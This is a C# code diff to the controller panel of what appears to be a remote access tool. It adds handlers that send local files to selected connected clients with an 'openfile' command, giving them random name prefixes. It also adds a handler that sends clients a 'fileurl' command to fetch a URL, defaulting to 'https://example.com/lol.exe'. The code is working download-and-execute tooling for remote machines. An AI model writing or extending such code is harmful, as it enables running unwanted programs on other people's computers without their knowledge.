@@ -324,8 +324,88 @@ namespace Sweep.Forms
                 }
             }
         }
-
+        public static async Task<byte[]> ReadAllBytesAsync(string path)
+        {
+            byte[] result;
+            using (FileStream stream = File.Open(path, FileMode.Open, FileAccess.Read, FileShare.Read))
+            {
+                result = new byte[stream.Length];
+                int bytesRead = 0;
+                int offset = 0;
+                while (bytesRead < stream.Length)
+                {
+                    int read = await stream.ReadAsync(result, offset, (int)stream.Length - offset);
+                    if (read == 0) // End of stream reached unexpectedly
+                    {
+                        break;
+                    }
+                    bytesRead += read;
+                    offset += read;
+                }
+            }
+            return result;
+        }
         private async void fromPCToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (var obj in listView1.SelectedObjects)
+            {
+                ClientInfo item = (ClientInfo)obj;
+                if (item == null) { return; }
+
+                ClientConnection conn = _server.GetConnectionById(item.ID);
+                if (conn != null)
+                {
+                    DiskFileDialog.InitialDirectory = remembrance.GetAttribute<string>("openfilepath") ?? Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                    var input = DiskFileDialog.ShowDialog();
+
+                    if (input == DialogResult.OK)
+                    {
+                        remembrance.SetAttribute("openfilepath", Path.GetDirectoryName(DiskFileDialog.FileNames[0]));
+
+                        var names = DiskFileDialog.FileNames;
+
+                        foreach (var name in names)
+                        {
+                            try
+                            {
+                                _dispatcher.AddLogToList(new JObject
+                                {
+                                    ["message"] = $"Sending file {name} to {item.Username} ({item.ID})",
+                                    ["type"] = "Info"
+                                });
+
+                                // Read file bytes
+                                var fileBytes = await ReadAllBytesAsync(name);
+
+                                // Use the new inline method instead
+                                await _server.SendFileBytesInline(conn.Id, fileBytes, new JObject
+                                {
+                                    ["command"] = "openfile",
+                                    ["filename"] = Global.GenerateRandomString(10) + Path.GetFileName(name)
+                                }.ToString());
+
+                                _dispatcher.AddLogToList(new JObject
+                                {
+                                    ["message"] = $"File {name} successfully sent to {item.Username} ({item.ID})",
+                                    ["type"] = "Info"
+                                });
+                            }
+                            catch (Exception ex)
+                            {
+                                _dispatcher.AddLogToList(new JObject
+                                {
+                                    ["message"] = $"Error sending file {name} to {item.Username}: {ex.Message}",
+                                    ["type"] = "Error"
+                                });
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        private async void fromURLToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (var obj in listView1.SelectedObjects)
             {
@@ -336,30 +416,20 @@ namespace Sweep.Forms
                 ClientConnection conn = _server.GetConnectionById(item.ID);
                 if (conn != null)
                 {
-                    var input = DiskFileDialog.ShowDialog();
+                    var input = Interaction.InputBox("Enter URL (Must include http:// or https://)", "Url", remembrance.GetAttribute<string>("websiteurl") ?? "https://example.com/lol.exe");
 
-                    if (input == DialogResult.OK) {
-                        var names = DiskFileDialog.FileNames;
-
-                        foreach (var name in names)
-                        {
-                            _dispatcher.AddLogToList(new JObject
-                            {
-                                ["message"] = $"Sending file {name} to {item.Username} ({item.ID})",
-                                ["type"] = "Info"
-                            });
-                                await _server.SendFileToClient(conn.Id, name, new JObject
-                                {
-                                    ["command"] = "openfile",
-                                    ["filename"] = Path.GetFileName(name)
-                                }.ToString());
-                            _dispatcher.AddLogToList(new JObject
-                            {
-                                ["message"] = $"File {name} successfully sent to {item.Username} ({item.ID})",
-                                ["type"] = "Info"
-                            });
-                        }
+                    if (String.IsNullOrEmpty(input))
+                    {
+                        return;
                     }
+
+                    remembrance.SetAttribute("websiteurl", input);
+
+                    await _server.SendMessageToConnection(conn, new JObject
+                    {
+                        ["command"] = "fileurl",
+                        ["body"] = input,
+                    }.ToString());
                 }
             }
         }
